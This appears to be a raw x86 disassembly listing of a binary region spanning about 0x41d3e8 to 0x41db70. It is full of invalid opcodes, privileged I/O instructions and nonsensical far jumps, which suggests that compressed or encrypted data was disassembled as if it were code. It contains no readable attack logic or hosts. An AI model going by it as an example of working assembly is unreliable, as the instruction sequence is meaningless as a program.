  41d3e8:	xchg   ebp,ebx
  41d3ea:	cs mov ebp,0xa44c99fb
  41d3f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3f1:	scas   al,BYTE PTR es:[edi]
  41d3f2:	(bad)  
  41d3f3:	mov    al,0x1c
  41d3f5:	retf   0x35b2
  41d3f8:	sub    bh,BYTE PTR [esp+esi*1]
  41d3fb:	inc    ebx
  41d3fc:	mov    ebp,0xcc5b8d2c
  41d401:	je     0x41d41b
  41d403:	or     al,0x28
  41d405:	test   eax,0xd06265cc
  41d40a:	ss pop eax
  41d40c:	dec    esi
  41d40d:	pop    esp
  41d40e:	dec    ecx
  41d40f:	jno    0x41d442
  41d411:	fcomip st,st(0)
  41d413:	inc    edx
  41d414:	jmp    0x41d41f
  41d416:	add    edx,edx
  41d418:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41d41a:	dec    edx
  41d41b:	clc    
  41d41c:	clc    
  41d41d:	mov    ds:0xf822a642,al
  41d422:	fld    st(2)
  41d424:	test   eax,0xba7df9d7
  41d429:	mov    ebp,DWORD PTR [ebx-0x2c001b02]
  41d42f:	mov    ds:0x776427da,eax
  41d434:	pop    esi
  41d435:	es push es
  41d437:	cmp    al,0xef
  41d439:	jp     0x41d3cc
  41d43b:	mov    ds:0x8384dc5a,al
  41d440:	mov    ecx,DWORD PTR [ebp+ebp*1+0x37370c25]
  41d447:	retf   0x257d
  41d44a:	fcmove st,st(2)
  41d44c:	and    BYTE PTR [edx+edi*8+0xd25fc31],0x71
  41d454:	mov    ch,0x6c
  41d456:	push   cs
  41d457:	inc    esi
  41d458:	jge    0x41d4c4
  41d45a:	pop    edi
  41d45b:	(bad)
  41d45e:	adc    esi,DWORD PTR [ecx+esi*4+0x45ef41a6]
  41d465:	xchg   ebx,eax
  41d466:	mov    edx,0x83cc4f98
  41d46b:	imul   eax,edx,0x5f
  41d46e:	inc    edi
  41d46f:	fstp   TBYTE PTR [eax-0x4d6cc8a0]
  41d475:	jb     0x41d4d8
  41d477:	cmp    eax,0x4a9958df
  41d47c:	(bad)
  41d480:	mov    ah,0x2d
  41d482:	(bad)  
  41d483:	out    0xb6,al
  41d485:	xchg   esi,eax
  41d486:	sbb    BYTE PTR [edx],0x97
  41d489:	pop    ebp
  41d48a:	repz scas al,BYTE PTR es:[edi]
  41d48c:	sti    
  41d48d:	push   ss
  41d48e:	test   eax,0xa8ba150
  41d493:	push   ebp
  41d494:	push   es
  41d495:	add    ch,bl
  41d497:	pusha  
  41d498:	mov    esi,0x7417c755
  41d49d:	dec    esp
  41d49e:	and    BYTE PTR [esi],bl
  41d4a0:	sub    dl,0x54
  41d4a3:	mov    ecx,0xf7986cd2
  41d4a8:	push   ds
  41d4a9:	and    DWORD PTR [ecx-0x7e],ebp
  41d4ac:	(bad)  
  41d4ad:	out    0x49,al
  41d4af:	fst    QWORD PTR [edx+edx*1+0x13]
  41d4b3:	daa    
  41d4b4:	pop    es
  41d4b5:	mov    esi,0x7e414bb
  41d4ba:	mov    ah,0x44
  41d4bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4bd:	add    BYTE PTR [eax],al
  41d4bf:	add    BYTE PTR [eax],al
  41d4c1:	add    dl,ah
  41d4c3:	or     al,BYTE PTR [ecx]
  41d4c5:	xchg   ecx,eax
  41d4c6:	jmp    0xbdbdc766
  41d4cb:	adc    esp,esi
  41d4cd:	pop    edi
  41d4ce:	and    DWORD PTR [eax+0x6d],eax
  41d4d1:	call   0x4f3:0x15034
  41d4d8:	add    BYTE PTR [eax],al
  41d4da:	xor    BYTE PTR [esi+0x79],ch
  41d4dd:	ds mov bh,0x4e
  41d4e0:	jge    0x41d4dc
  41d4e2:	(bad)  
  41d4e3:	jns    0x41d4db
  41d4e5:	pop    edx
  41d4e6:	rol    DWORD PTR [esi],cl
  41d4e8:	lahf   
  41d4e9:	rcl    DWORD PTR [edi+0x6432c593],0x76
  41d4f0:	mov    edi,0xa27af583
  41d4f5:	fucompp 
  41d4f7:	stos   DWORD PTR es:[edi],eax
  41d4f8:	xor    DWORD PTR [esi+0x3c],0x62
  41d4fc:	scas   eax,DWORD PTR es:[edi]
  41d4fd:	mov    ch,0xdc
  41d4ff:	xor    ch,bh
  41d501:	mov    ebx,0x33fbe7d7
  41d506:	xor    al,0x9c
  41d508:	push   edx
  41d509:	iret   
  41d50a:	push   eax
  41d50b:	xchg   esp,eax
  41d50c:	jns    0x41d558
  41d50e:	pop    es
  41d50f:	and    dl,ah
  41d511:	mov    ch,0x12
  41d513:	sub    DWORD PTR [esi-0x6d],ebp
  41d516:	addr16 inc ebp
  41d518:	lds    edi,FWORD PTR [ebx+0x43]
  41d51b:	call   0x1a66b726
  41d520:	xor    DWORD PTR [esi],0xfffffffa
  41d523:	push   ds
  41d524:	inc    eax
  41d525:	dec    ecx
  41d526:	inc    esi
  41d527:	add    cl,BYTE PTR [edx-0x24]
  41d52a:	rcl    BYTE PTR [esi],cl
  41d52c:	jp     0x41d568
  41d52e:	(bad)  
  41d52f:	jne    0x41d4e6
  41d531:	xchg   edi,eax
  41d532:	data16 aaa 
  41d534:	adc    bl,BYTE PTR [edi-0x10e17ce5]
  41d53a:	jp     0x41d4ec
  41d53c:	popf   
  41d53d:	add    al,0x90
  41d53f:	xor    al,0x95
  41d541:	stos   BYTE PTR es:[edi],al
  41d542:	xchg   DWORD PTR [ecx-0x5fe8ee37],esi
  41d548:	cmp    BYTE PTR [eax-0x65],0xe1
  41d54c:	mov    ds:0xdda0693,al
  41d551:	test   al,0xae
  41d553:	push   esi
  41d554:	or     ebx,ebx
  41d556:	xor    BYTE PTR [ebx+0x19],0x61
  41d55a:	ret    
  41d55b:	lods   eax,DWORD PTR ds:[esi]
  41d55c:	shl    DWORD PTR [eax],cl
  41d55e:	mov    edx,0xd774f1fa
  41d563:	push   ebx
  41d564:	mov    ds:0x54a64e94,eax
  41d569:	aaa    
  41d56a:	ror    dl,0x9f
  41d56d:	fisub  DWORD PTR [edx+0x7914a6de]
  41d573:	push   ds
  41d574:	push   cs
  41d575:	inc    BYTE PTR [ebx+esi*4+0x10]
  41d579:	xchg   edx,eax
  41d57a:	imul   ecx,DWORD PTR [eax],0x7
  41d57d:	lods   eax,DWORD PTR ds:[esi]
  41d57e:	push   edx
  41d57f:	mov    DWORD PTR [ecx-0x1acd6b74],eax
  41d585:	lds    ecx,FWORD PTR [edi+0x3b3ba3c7]
  41d58b:	add    eax,0x2198fd37
  41d590:	out    0x6,eax
  41d592:	scas   eax,DWORD PTR es:[edi]
  41d593:	or     al,0x45
  41d595:	jns    0x41d526
  41d597:	loopne 0x41d52c
  41d599:	push   esp
  41d59a:	stc    
  41d59b:	call   0x67e5:0xc7a63743
  41d5a2:	jecxz  0x41d5ca
  41d5a4:	ins    BYTE PTR es:[edi],dx
  41d5a5:	addr16 pop esp
  41d5a7:	ins    BYTE PTR es:[edi],dx
  41d5a8:	dec    eax
  41d5a9:	int3   
  41d5aa:	ds data16 xor al,0xc3
  41d5ae:	repz sbb edx,DWORD PTR [ecx]
  41d5b1:	hlt    
  41d5b2:	test   al,0x4
  41d5b4:	pop    edi
  41d5b5:	fdiv   DWORD PTR ds:0x4766d0e6
  41d5bb:	idiv   ebp
  41d5bd:	ja     0x41d591
  41d5bf:	aaa    
  41d5c0:	jp     0x41d584
  41d5c2:	xor    ch,BYTE PTR [ecx+0x31]
  41d5c5:	cmp    BYTE PTR [edi],al
  41d5c7:	ss jmp 0x41d619
  41d5ca:	or     ebx,esi
  41d5cc:	inc    edx
  41d5cd:	adc    DWORD PTR [esp+edi*2-0x280b54d2],esp
  41d5d4:	xor    ebx,0xffffffdc
  41d5d7:	push   ecx
  41d5d8:	inc    esp
  41d5d9:	cmp    al,0xfe
  41d5db:	ins    BYTE PTR es:[edi],dx
  41d5dc:	sbb    eax,0x7f971db3
  41d5e1:	daa    
  41d5e2:	jns    0x41d595
  41d5e4:	push   es
  41d5e5:	mov    dh,0xc7
  41d5e7:	scas   al,BYTE PTR es:[edi]
  41d5e8:	mov    al,0x1f
  41d5ea:	xchg   BYTE PTR [ecx+0x645eaef4],al
  41d5f0:	xor    eax,DWORD PTR [ebx-0x3b]
  41d5f3:	cwde   
  41d5f4:	pop    ds
  41d5f5:	cdq    
  41d5f6:	fbstp  TBYTE PTR [ebx-0x6bd1e079]
  41d5fc:	cwde   
  41d5fd:	xchg   ebp,eax
  41d5fe:	fistp  QWORD PTR [eax+edi*8]
  41d601:	cs xchg esp,eax
  41d603:	push   eax
  41d604:	mov    dl,0xed
  41d606:	daa    
  41d607:	push   esp
  41d608:	sub    eax,0x752de0c2
  41d60d:	cli    
  41d60e:	imul   ebx,DWORD PTR [eax],0xffffffa8
  41d611:	ss (bad) 
  41d613:	push   ecx
  41d614:	dec    eax
  41d615:	jmp    0x1d:0xf2a5b29b
  41d61c:	push   eax
  41d61d:	push   eax
  41d61e:	jbe    0x41d698
  41d620:	dec    esp
  41d621:	push   0xadf2ddb8
  41d626:	jae    0x41d666
  41d628:	inc    eax
  41d629:	mov    cl,0xf5
  41d62b:	es leave 
  41d62d:	sahf   
  41d62e:	mov    ds:0xd98aa6f7,eax
  41d633:	push   edx
  41d634:	dec    ebx
  41d635:	outs   dx,DWORD PTR ds:[esi]
  41d636:	test   DWORD PTR [esi],ecx
  41d638:	mov    esp,0x201d1677
  41d63d:	jno    0x41d6b1
  41d63f:	sti    
  41d640:	pusha  
  41d641:	arpl   WORD PTR [ecx],di
  41d643:	mov    esp,0x6c16e09d
  41d648:	test   al,0x2e
  41d64a:	jnp    0x41d6b2
  41d64c:	imul   eax,ebp,0x1498ce7b
  41d652:	stos   DWORD PTR es:[edi],eax
  41d653:	je     0x41d68a
  41d655:	jecxz  0x41d6a3
  41d657:	cs lock rcl BYTE PTR cs:[ecx+0x79],cl
  41d65d:	push   ss
  41d65e:	add    dl,al
  41d660:	pop    eax
  41d661:	mov    ecx,0x94835c1d
  41d666:	push   0xd8be2c91
  41d66b:	dec    ecx
  41d66c:	sub    esi,DWORD PTR [eax+0x5b]
  41d66f:	mov    esi,fs
  41d671:	cmp    DWORD PTR [esi+0x69],0xffffffe1
  41d675:	ja     0x41d6ac
  41d677:	push   ebp
  41d678:	push   0x25
  41d67a:	sbb    esp,0xfffffff3
  41d67d:	jne    0x41d6ef
  41d67f:	xchg   esi,eax
  41d680:	aam    0xad
  41d682:	xchg   edx,eax
  41d683:	test   DWORD PTR fs:[ecx-0x752db067],ecx
  41d68a:	pop    esp
  41d68b:	(bad)  
  41d68c:	lock cmp ecx,DWORD PTR [ebx-0x78]
  41d690:	es pop esi
  41d692:	js     0x41d65e
  41d694:	not    ebp
  41d696:	and    BYTE PTR [ebp+0x447c8338],al
  41d69c:	cmp    DWORD PTR [ebx-0x6],esi
  41d69f:	xor    eax,0x9d7fe7b2
  41d6a4:	imul   esi,DWORD PTR [edi*1-0x2d10bd1f],0x6bdf9181
  41d6af:	xor    al,0x9f
  41d6b1:	jg     0x41d6cb
  41d6b3:	mov    esp,DWORD PTR [edi+0xe2315da]
  41d6b9:	pop    ds
  41d6ba:	adc    al,0x26
  41d6bc:	fwait
  41d6bd:	daa    
  41d6be:	dec    esi
  41d6bf:	std    
  41d6c0:	xor    BYTE PTR [eax-0x68],cl
  41d6c3:	mov    al,0x40
  41d6c5:	(bad)  
  41d6c6:	dec    edi
  41d6c7:	add    al,0x64
  41d6c9:	add    bh,BYTE PTR [ecx-0x4ec782b7]
  41d6cf:	call   0xb716:0x23872087
  41d6d6:	and    BYTE PTR cs:[eax+0x69aca6e4],dh
  41d6dd:	push   esi
  41d6de:	enter  0xe75a,0x99
  41d6e2:	icebp  
  41d6e3:	push   0xec415850
  41d6e8:	lahf   
  41d6e9:	push   0x839d8e13
  41d6ee:	test   BYTE PTR [edx+0x4a],ah
  41d6f1:	imul   ebx,esp,0xffffffbd
  41d6f4:	aam    0x56
  41d6f6:	(bad)  
  41d6f7:	lock sti 
  41d6f9:	mov    eax,ds:0x539f9718
  41d6fe:	jbe    0x41d6d0
  41d700:	data16 xchg BYTE PTR [ebx+0x29],cl
  41d704:	dec    esp
  41d705:	popf   
  41d706:	jmp    0x41d6f1
  41d708:	jge    0x41d6a8
  41d70a:	adc    BYTE PTR [edi],bh
  41d70c:	jbe    0x41d782
  41d70e:	xchg   esp,eax
  41d70f:	pop    ebx
  41d710:	int3   
  41d711:	fmul   QWORD PTR [ebp-0x2f3b8fbb]
  41d717:	sub    bl,BYTE PTR [ebp-0x43]
  41d71a:	cdq    
  41d71b:	xor    ebx,eax
  41d71d:	out    0xb6,al
  41d71f:	lea    esp,[ebx-0x62]
  41d722:	or     ecx,esi
  41d724:	pop    esp
  41d725:	in     al,0x69
  41d727:	cmp    dh,BYTE PTR [edi]
  41d729:	retf   
  41d72a:	jnp    0x41d738
  41d72c:	out    dx,eax
  41d72d:	jmp    0xde50db4f
  41d732:	sbb    BYTE PTR [eax],bh
  41d734:	ins    DWORD PTR es:[edi],dx
  41d735:	jmp    0x19212783
  41d73a:	add    al,0x88
  41d73c:	cld    
  41d73d:	std    
  41d73e:	push   edx
  41d73f:	mov    al,0x2f
  41d741:	and    BYTE PTR [esi],bh
  41d743:	dec    edi
  41d744:	fild   DWORD PTR [ebx-0x3e666d9a]
  41d74a:	pop    eax
  41d74b:	sbb    al,0xea
  41d74d:	sbb    eax,0xb09ae9ce
  41d752:	pop    es
  41d753:	imul   ebx,DWORD PTR [ebp+0xd],0x5
  41d757:	into   
  41d758:	pop    eax
  41d759:	dec    esp
  41d75a:	loopne 0x41d72b
  41d75c:	test   BYTE PTR [eax],ah
  41d75e:	xchg   edi,eax
  41d75f:	mov    esp,0x12e33777
  41d764:	fldcw  WORD PTR [eax-0x21]
  41d767:	ja     0x41d7db
  41d769:	gs fs scas al,BYTE PTR es:[edi]
  41d76c:	not    DWORD PTR [eax]
  41d76e:	xchg   edi,eax
  41d76f:	mul    ah
  41d771:	xor    DWORD PTR [ebx+0x2d],edx
  41d774:	mov    ch,BYTE PTR [edi+0x7]
  41d777:	push   ecx
  41d778:	pusha  
  41d779:	mov    dh,0x9e
  41d77b:	adc    bh,BYTE PTR [edx+0x39930260]
  41d781:	aam    0xa3
  41d783:	ficom  DWORD PTR [eax]
  41d785:	dec    esp
  41d786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d787:	xchg   ebp,eax
  41d788:	cli    
  41d789:	pop    ds
  41d78a:	jge    0x41d7c8
  41d78c:	add    ecx,0x7f
  41d78f:	inc    ebp
  41d790:	xchg   cl,bl
  41d792:	inc    eax
  41d793:	push   ss
  41d794:	gs pop ax
  41d797:	adc    BYTE PTR [esi+esi*4-0x40],al
  41d79b:	pop    ebx
  41d79c:	add    edx,edx
  41d79e:	cmp    dh,BYTE PTR [edx-0x6f5026dd]
  41d7a4:	sbb    BYTE PTR [eax+0x4082e150],bl
  41d7aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7ab:	jle    0x41d815
  41d7ad:	fnstenv [ecx+eiz*4-0x3961887]
  41d7b4:	mov    BYTE PTR [ebp-0x5c],cl
  41d7b7:	sbb    BYTE PTR [eax+eax*8-0x42],0x38
  41d7bc:	cmp    DWORD PTR [esi+0x4e4b76e],edi
  41d7c2:	ins    BYTE PTR es:[edi],dx
  41d7c3:	inc    ebp
  41d7c4:	jnp    0x41d782
  41d7c6:	clc    
  41d7c7:	mov    ch,0x75
  41d7c9:	rcr    DWORD PTR [esi+0xc2d32dd],0x94
  41d7d0:	xchg   DWORD PTR [ecx+0x69ddcc05],esp
  41d7d6:	daa    
  41d7d7:	mov    eax,ds:0x6edb91ec
  41d7dc:	mov    ds:0x6770dc60,al
  41d7e1:	mov    db5,ebp
  41d7e4:	add    eax,0x8de51fc1
  41d7e9:	push   ds
  41d7ea:	sti    
  41d7eb:	(bad)
  41d7ef:	push   ds
  41d7f0:	imul   eax,DWORD PTR [edi-0x38],0xffffff9c
  41d7f4:	xchg   esi,eax
  41d7f5:	push   ebx
  41d7f6:	sbb    BYTE PTR [esi+0x6fa91dc8],0x8
  41d7fd:	iret   
  41d7fe:	aam    0x9c
  41d800:	lock das 
  41d802:	jp     0x41d86a
  41d804:	jnp    0x41d7fe
  41d806:	add    dl,ah
  41d808:	test   al,0xc6
  41d80a:	xchg   BYTE PTR [ecx+0x77349aaa],dh
  41d810:	mov    gs,WORD PTR ds:0xd8d6b8df
  41d816:	adc    BYTE PTR [esi],ah
  41d818:	ds push cs
  41d81a:	(bad)  
  41d81b:	xchg   ebx,eax
  41d81c:	or     BYTE PTR [ebx+edi*4],cl
  41d81f:	popa   
  41d820:	xor    eax,0x410c1b6f
  41d825:	sub    ah,dh
  41d827:	pusha  
  41d828:	fiadd  DWORD PTR [ebx+0x1a840e11]
  41d82e:	jns    0x41d89b
  41d830:	and    dh,dl
  41d832:	call   0x38fa:0x6e5b1281
  41d839:	xor    DWORD PTR [edi+0x74a44aed],eax
  41d83f:	mov    al,ds:0x22a89225
  41d844:	and    al,0x98
  41d846:	cs jno 0x41d869
  41d849:	mov    edx,0x81d3254c
  41d84e:	inc    esp
  41d84f:	cmp    ah,BYTE PTR [edx-0x421617d0]
  41d855:	fcomp  DWORD PTR [ecx-0x34d07893]
  41d85b:	mov    dl,0x9c
  41d85d:	xor    DWORD PTR [ebx],edx
  41d85f:	sub    BYTE PTR [esi+0x133852cb],cl
  41d865:	pop    ebx
  41d866:	mov    edx,0x579e4336
  41d86b:	add    BYTE PTR [eax-0x20],0xd2
  41d86f:	es pop edi
  41d871:	sbb    BYTE PTR [ebx-0x37ec2638],cl
  41d877:	inc    esp
  41d878:	dec    esi
  41d879:	dec    esp
  41d87a:	lahf   
  41d87b:	addr16 ret 0x96d0
  41d87f:	sub    DWORD PTR [edx-0x4f],0xda177c81
  41d886:	repnz pop es
  41d888:	jns    0x41d80a
  41d88a:	xlat   BYTE PTR ds:[ebx]
  41d88b:	iret   
  41d88c:	fild   DWORD PTR [esi+eiz*1+0x5ab4c63]
  41d893:	pushf  
  41d894:	icebp  
  41d895:	pop    es
  41d896:	push   0xffffffc9
  41d898:	stos   BYTE PTR es:[edi],al
  41d899:	add    al,0x68
  41d89b:	xchg   ecx,eax
  41d89c:	retf   
  41d89d:	sbb    eax,0xda680c74
  41d8a2:	jg     0x41d8e5
  41d8a4:	jno    0x41d867
  41d8a6:	xor    DWORD PTR ds:0x1f2f761c,ebp
  41d8ac:	int    0x64
  41d8ae:	push   cs
  41d8af:	mov    cs,esp
  41d8b1:	sub    ah,cl
  41d8b3:	push   es
  41d8b4:	or     ecx,DWORD PTR [ebx-0x6e]
  41d8b7:	cmp    DWORD PTR [esi],edx
  41d8b9:	or     ebp,DWORD PTR [ecx-0x22024f9e]
  41d8bf:	pushf  
  41d8c0:	out    dx,eax
  41d8c1:	scas   eax,DWORD PTR es:[edi]
  41d8c2:	mov    BYTE PTR [ebp-0x616ba8b1],al
  41d8c8:	(bad)  
  41d8c9:	ffreep st(3)
  41d8cb:	push   edi
  41d8cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8cd:	popa   
  41d8ce:	mov    esi,0xe8a4d946
  41d8d3:	jle    0x41d8f0
  41d8d5:	sbb    ch,BYTE PTR [edx+0x69]
  41d8d8:	and    ecx,DWORD PTR [edx]
  41d8da:	sub    BYTE PTR [edx],bh
  41d8dc:	lock add al,0x7b
  41d8df:	inc    ecx
  41d8e0:	mov    dh,BYTE PTR [ecx+ebx*8]
  41d8e3:	dec    edi
  41d8e4:	out    0xb5,al
  41d8e6:	mov    eax,0xbad0ba69
  41d8eb:	cmp    bh,BYTE PTR [esi*2-0x7a52af63]
  41d8f2:	sbb    BYTE PTR [ecx-0x4e43d137],al
  41d8f8:	xlat   BYTE PTR ds:[ebx]
  41d8f9:	push   ss
  41d8fa:	adc    al,BYTE PTR [ebx-0x4258c05b]
  41d900:	xchg   edx,eax
  41d901:	or     eax,0x90ce9a07
  41d906:	xor    ebx,esp
  41d908:	inc    ebx
  41d909:	adc    DWORD PTR [ecx],esi
  41d90b:	jns    0x41d8b6
  41d90d:	mov    esp,0x930306ae
  41d912:	(bad)  
  41d913:	leave  
  41d914:	dec    ebp
  41d915:	jmp    0x2528:0x2651c980
  41d91c:	bound  ebp,QWORD PTR [esi+0x6bab75d1]
  41d922:	test   eax,0x3cd314fe
  41d927:	mov    eax,0xaebcaa2a
  41d92c:	shl    DWORD PTR [ebx],0x4e
  41d92f:	out    0x3b,al
  41d931:	add    eax,DWORD PTR [ebp-0x47]
  41d934:	lock xchg esi,eax
  41d936:	add    dh,ch
  41d938:	pop    es
  41d939:	clc    
  41d93a:	cmp    ebp,DWORD PTR [ecx]
  41d93c:	js     0x41d8f9
  41d93e:	sbb    bl,dh
  41d940:	push   ecx
  41d941:	lahf   
  41d942:	out    0xc3,eax
  41d944:	out    dx,eax
  41d945:	ror    DWORD PTR [eax+0x765a4682],0xa4
  41d94c:	iret   
  41d94d:	push   0x79
  41d94f:	push   edx
  41d950:	shl    DWORD PTR [esi],cl
  41d952:	pushf  
  41d953:	repz adc ah,ch
  41d956:	mov    ds:0x25e5bcbb,eax
  41d95b:	add    eax,0x4aedfc95
  41d960:	jmp    0x3e7f1e51
  41d965:	ins    BYTE PTR es:[edi],dx
  41d966:	add    BYTE PTR [edx-0x38],0x39
  41d96a:	(bad)  
  41d96b:	mov    ch,0x4d
  41d96d:	popf   
  41d96e:	aad    0x38
  41d970:	rcl    DWORD PTR [esi-0x40],cl
  41d973:	push   es
  41d974:	nop
  41d975:	(bad)  
  41d976:	dec    eax
  41d977:	cmp    DWORD PTR [esi+ebp*8],edi
  41d97a:	push   es
  41d97b:	or     DWORD PTR [edi-0x20e0f44a],esp
  41d981:	jecxz  0x41d992
  41d983:	pop    ebp
  41d984:	mov    ds:0x67e32855,eax
  41d989:	inc    eax
  41d98a:	push   edi
  41d98b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d98c:	mov    ds:0x30ff137e,al
  41d991:	arpl   ax,dx
  41d993:	jmp    0x222c7a9e
  41d998:	in     al,dx
  41d999:	nop
  41d99a:	push   ebp
  41d99b:	sub    BYTE PTR [edx-0x581c62ca],ah
  41d9a1:	ja     0x41d9c5
  41d9a3:	xchg   edi,eax
  41d9a4:	sbb    DWORD PTR [ecx],esi
  41d9a6:	ss nop
  41d9a8:	push   esi
  41d9a9:	push   esi
  41d9aa:	ds xchg ebx,eax
  41d9ac:	or     DWORD PTR [ecx+edx*8-0x525de4de],esi
  41d9b3:	add    bh,0x91
  41d9b6:	sbb    DWORD PTR [ecx],esi
  41d9b8:	add    BYTE PTR [esi+0x723d76ec],al
  41d9be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9bf:	(bad)  
  41d9c0:	mov    al,0x3f
  41d9c2:	jne    0x41da32
  41d9c4:	mov    eax,0xaffe7a4f
  41d9c9:	ror    BYTE PTR [eax],cl
  41d9cb:	sbb    bl,BYTE PTR ds:0x0
  41d9d1:	add    BYTE PTR [esi+0x5e],bl
  41d9d4:	loope  0x41da44
  41d9d6:	loope  0x41d9d7
  41d9d8:	fistp  QWORD PTR [esi-0x6e]
  41d9db:	adc    DWORD PTR [esi],0xa
  41d9de:	lods   eax,DWORD PTR ds:[esi]
  41d9df:	pop    ecx
  41d9e0:	stos   BYTE PTR es:[edi],al
  41d9e1:	cwde   
  41d9e2:	daa    
  41d9e3:	push   ebp
  41d9e4:	add    DWORD PTR [eax],eax
  41d9e6:	repz add al,0x0
  41d9e9:	add    BYTE PTR [edi+0x15],bl
  41d9ec:	mov    dl,0x5f
  41d9ee:	imul   ebx,DWORD PTR [esi+0x5e11356],0x167cb544
  41d9f8:	pop    ebx
  41d9f9:	sub    BYTE PTR [edi-0x404a1f12],al
  41d9ff:	jp     0x41da57
  41da01:	jae    0x41da01
  41da03:	jne    0x41d9bf
  41da05:	inc    ebx
  41da06:	retf   0x154b
  41da09:	test   al,0xc9
  41da0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da0c:	(bad)  
  41da0d:	aaa    
  41da0e:	mov    edx,0x9543307b
  41da13:	mov    dl,0x13
  41da15:	dec    ebx
  41da16:	xchg   esi,eax
  41da17:	mov    ah,0x69
  41da19:	jmp    0x41d9a6
  41da1b:	add    al,0x2c
  41da1d:	or     dh,BYTE PTR [ecx]
  41da1f:	lock test al,0xc4
  41da22:	adc    esp,DWORD PTR [ebp+0x55]
  41da25:	mov    DWORD PTR [ebp+eiz*1-0x3d],ecx
  41da29:	jle    0x41da26
  41da2b:	pop    ecx
  41da2c:	mov    dh,0x2b
  41da2e:	or     BYTE PTR [esi+ecx*1+0x1416b67],dl
  41da35:	or     eax,ebp
  41da37:	jle    0x41da96
  41da39:	mov    DWORD PTR [esi],ecx
  41da3b:	aas    
  41da3c:	fucomi st,st(1)
  41da3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da3f:	out    0x11,al
  41da41:	jge    0x41d9d3
  41da43:	inc    esi
  41da44:	xchg   edi,eax
  41da45:	mov    ah,0x79
  41da47:	fincstp 
  41da49:	jge    0x41da2e
  41da4b:	call   FWORD PTR [eax-0x4ac70b7f]
  41da51:	fdiv   st,st(4)
  41da53:	jge    0x41d9da
  41da55:	mov    ah,0x8a
  41da57:	in     al,0xd0
  41da59:	lods   al,BYTE PTR ds:[esi]
  41da5a:	fiadd  WORD PTR [edi]
  41da5c:	jmp    0x2ddac1c7
  41da61:	jmp    0x9da1:0x17b7aa3e
  41da68:	xlat   BYTE PTR ds:[ebx]
  41da69:	cmp    DWORD PTR [ecx+0x56],ebp
  41da6c:	adc    esp,DWORD PTR [edi]
  41da6e:	sbb    bh,BYTE PTR [eax+0x747f0d8c]
  41da74:	sub    ebx,DWORD PTR [edx]
  41da76:	adc    eax,0x5228821d
  41da7b:	sbb    al,0x74
  41da7d:	out    0xb6,al
  41da7f:	idiv   BYTE PTR [esi-0x5a]
  41da82:	xchg   esi,eax
  41da83:	sbb    al,0x84
  41da85:	cmp    al,0xef
  41da87:	or     BYTE PTR gs:[edx+0x1c64d505],ch
  41da8e:	or     ebx,edx
  41da90:	or     DWORD PTR [edi+0x28],ebx
  41da93:	lea    edi,[esi+ebp*1-0x22cf05c6]
  41da9a:	mov    edi,0xed9b861e
  41da9f:	mov    edx,0xe6a4556c
  41daa4:	adc    dl,bl
  41daa6:	cmp    DWORD PTR [eax],ebx
  41daa8:	sub    eax,ebx
  41daaa:	mov    bh,0xab
  41daac:	hlt    
  41daad:	jbe    0x41da5b
  41daaf:	cli    
  41dab0:	cmp    ebp,esp
  41dab2:	sbb    BYTE PTR [ecx-0x70476d06],dl
  41dab8:	stc    
  41dab9:	push   esi
  41dabb:	(bad)  
  41dabc:	das    
  41dabd:	pop    ebx
  41dabe:	stc    
  41dabf:	fnstsw WORD PTR [eax-0x49]
  41dac2:	add    ebx,DWORD PTR [edx-0x1f]
  41dac5:	sbb    edx,DWORD PTR ds:0xb9a9f32f
  41dacb:	mov    bh,0x9c
  41dacd:	jo     0x41da98
  41dacf:	inc    ebx
  41dad0:	(bad)  
  41dad1:	cs ret 
  41dad3:	pop    es
  41dad4:	jno    0x41db1c
  41dad6:	das    
  41dad7:	or     edi,edx
  41dad9:	fst    DWORD PTR ds:0x7c38a812
  41dadf:	pop    ecx
  41dae0:	imul   ecx,esp,0x2663815c
  41dae6:	call   0x2b40b311
  41daeb:	retf   0x395
  41daee:	into   
  41daef:	dec    edi
  41daf0:	mov    esi,0xb90f0d39
  41daf5:	(bad)  
  41daf6:	cmp    al,0x8e
  41daf8:	xchg   esi,eax
  41daf9:	jp     0x41db60
  41dafb:	pushf  
  41dafc:	dec    edx
  41dafd:	xchg   dh,al
  41daff:	dec    DWORD PTR [eax]
  41db01:	retf   
  41db02:	fldcw  WORD PTR [ebx-0x28]
  41db05:	das    
  41db06:	push   esp
  41db07:	push   ds
  41db08:	mov    dl,BYTE PTR [edx+ebp*8-0x4b]
  41db0c:	pop    esi
  41db0d:	call   0xc9a0:0xb745a5e1
  41db14:	scas   al,BYTE PTR es:[edi]
  41db15:	js     0x41dacb
  41db17:	xchg   ebp,eax
  41db18:	out    dx,al
  41db19:	xor    DWORD PTR [eax*2+0x28a509d4],eax
  41db20:	push   esp
  41db21:	ret    0x41b8
  41db24:	cmp    DWORD PTR [eax],ebx
  41db26:	(bad)  
  41db27:	in     al,0x7b
  41db29:	inc    BYTE PTR [ebx]
  41db2b:	int    0x35
  41db2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db2e:	lahf   
  41db2f:	inc    eax
  41db30:	cmp    esp,ecx
  41db32:	mov    al,ds:0xe87d1568
  41db37:	leave  
  41db38:	and    DWORD PTR [edi-0x2577a89e],ebx
  41db3e:	and    dl,BYTE PTR [edx+0x39]
  41db41:	lahf   
  41db42:	adc    edx,DWORD PTR [edx+0x72]
  41db45:	mov    ds:0xe292c3c9,eax
  41db4a:	fs pop ecx
  41db4c:	add    ah,ah
  41db4e:	sbb    al,0x87
  41db50:	sub    BYTE PTR [ebx+0x2a],bh
  41db53:	aam    0xd7
  41db55:	repz pop ds
  41db57:	out    dx,al
  41db58:	enter  0xe898,0x46
  41db5c:	scas   eax,DWORD PTR es:[edi]
  41db5d:	daa    
  41db5e:	sbb    edi,DWORD PTR [edx+0x6e33757b]
  41db64:	out    dx,eax
  41db65:	mov    eax,ds:0x6572b93
  41db6a:	ss in  al,0x47
  41db6d:	popa   
  41db6e:	pop    esp
  41db6f:	daa    
  41db70:	mov    eax,0x3b572146
